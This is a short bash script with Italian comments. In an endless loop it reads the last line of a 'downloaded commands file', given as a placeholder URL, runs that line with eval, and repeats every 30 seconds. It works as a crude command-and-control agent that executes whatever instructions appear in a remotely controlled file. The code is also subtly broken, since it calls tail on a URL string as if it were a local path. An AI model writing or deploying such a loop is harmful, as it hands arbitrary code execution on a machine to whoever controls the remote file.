#!/bin/bash

# Percorso del file dei comandi scaricato
remote_file_path="URL_DEL_FILE_DA_SCARICARE"

# Loop infinito
while true
do
    # Estrai ultimo comando dal file
    last_command=$(tail -1 "$remote_file_path")
    
    # Esegue il comando
    eval "$last_command"
    
    # Attende 30 secondi prima di eseguire di nuovo
    sleep 30
done